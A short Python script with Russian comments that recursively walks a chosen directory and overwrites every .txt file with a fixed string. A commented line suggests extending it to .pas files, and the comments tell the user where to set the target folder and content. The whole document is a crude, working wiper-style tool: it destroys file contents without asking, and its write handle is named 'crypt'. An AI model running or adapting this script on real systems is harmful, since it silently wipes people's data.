#STARTED#
# -*- coding: utf8 -*-
#Программа для записи в файлах с определённым расширением и в определённых директориях
#не работает с .docx
import sys, os
def a(python):
    #запись в вайл содержимого
    with open(python,"w") as crypt:#весь этот код создаётся в том файле, который мы проверяем
        crypt.write('''Приветик''')#здесь записываем то, что хотим
def walk(dir): 
	for name in os.listdir(dir): 
		path = os.path.join(dir, name) 
		if os.path.isfile(path): 
			if os.path.splitext(path)[1]==".txt": #то расширение, в которое мы записываем
				a(path)
			#elif os.path.splitext(path)[1]==".pas": a(path)   (можно и паскаль взять и записать то, что нужно в файл)
			else: pass 
		else: walk(path) 
walk('C:\\text') #здесь пишем ту директорию, в который нужно записывать
